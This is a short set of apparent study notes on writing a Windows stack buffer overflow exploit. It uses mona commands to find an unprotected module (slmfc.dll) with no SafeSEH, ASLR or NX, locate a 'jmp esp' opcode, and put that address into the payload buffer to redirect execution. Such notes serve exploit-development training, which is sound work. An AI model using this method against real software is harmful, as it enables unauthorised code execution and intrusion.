#Step 1. Look at available Modules with the following command:
!mona modules

# Step 2. Identify a module that has the following values
Rebase: False
SafeSEH: False
ASLR: False
NXCompat: False

# Step 3. Record file name, will use it to search for optcodes to jmp esp
!mona find -s "\xff\xe4" -m slmfc.dll

# Step 4. If optcodes aren't found may have to jmp another mem location, use find optcode metasploit nasm to identify hex value

# Step 5. Click on the M for modules and look for Read Execute (R E) associated with said file (slmfc.dll)
Double click on the line and identify memory address space and that will be used to record in little endian formate in place of the B's payload buffer.
